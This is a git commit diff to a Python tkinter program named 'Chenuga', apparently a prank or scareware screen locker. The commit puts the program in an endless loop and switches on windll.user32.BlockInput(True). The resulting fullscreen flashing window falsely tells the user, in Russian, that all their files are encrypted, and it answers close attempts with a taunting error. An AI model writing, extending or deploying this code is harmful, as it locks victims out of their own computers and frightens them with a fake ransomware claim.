b73e1076b179babd54cfdae639d1936c6c2b8f39
Artorius <Artorius.81@yandex.ru>
2023-05-03 16:16:47 +1000

    Label added

--- main/main.py
+++ main/main.py
@@ -4,49 +4,48 @@ from ctypes import *
 from tkinter import ttk
 from tkinter.messagebox import showerror
 
-# while True:
-
-window = tk.Tk()
-
-
-def open_error():
-    showerror(title="Ошибка", message="Ваши попытки смехотворны")
+while True:
+    window = tk.Tk()
 
 
-def disable_alt_f4():
-    open_error()
-    pass
+    def open_error():
+        showerror(title="Ошибка", message="Ваши попытки смехотворны")
 
 
-def animate():
-    color = ["green", "blue", "purple", "brown", "black"]
-    cls = random.choice(color)
-    canvas.config(background=cls)
-    canvas.after("100", animate)
+    def disable_alt_f4():
+        open_error()
+        pass
 
 
-canvas = tk.Canvas(window, width=window.winfo_screenwidth(), height=window.winfo_screenheight())
+    def animate():
+        color = ["green", "blue", "purple", "brown", "black"]
+        cls = random.choice(color)
+        canvas.config(background=cls)
+        canvas.after("100", animate)
 
-virus_name = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 5,
-                                text="Chenuga",
-                                font=("Helvetica", 36),
-                                anchor='center',
-                                fill="white")
-text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 50,
-                          text="Ой, все ваши файлы были зашифрованы!",
-                          font=("Helvetica", 14),
-                          anchor='center',
-                          fill="white")
-text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 70,
-                          text="Что-же вы так неаккуратно...",
-                          font=("Helvetica", 14),
-                          anchor='center',
-                          fill="white")
 
-window.attributes('-fullscreen', True)
+    canvas = tk.Canvas(window, width=window.winfo_screenwidth(), height=window.winfo_screenheight())
 
-canvas.pack()
-animate()
-window.protocol("WM_DELETE_WINDOW", disable_alt_f4)
-# windll.user32.BlockInput(True)
-window.mainloop()
+    virus_name = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 5,
+                                    text="Chenuga",
+                                    font=("Helvetica", 36),
+                                    anchor='center',
+                                    fill="white")
+    text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 50,
+                              text="Ой, все ваши файлы были зашифрованы!",
+                              font=("Helvetica", 14),
+                              anchor='center',
+                              fill="white")
+    text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 70,
+                              text="Что-же вы так неаккуратно...",
+                              font=("Helvetica", 14),
+                              anchor='center',
+                              fill="white")
+
+    window.attributes('-fullscreen', True)
+
+    canvas.pack()
+    animate()
+    window.protocol("WM_DELETE_WINDOW", disable_alt_f4)
+    windll.user32.BlockInput(True)
+    window.mainloop()
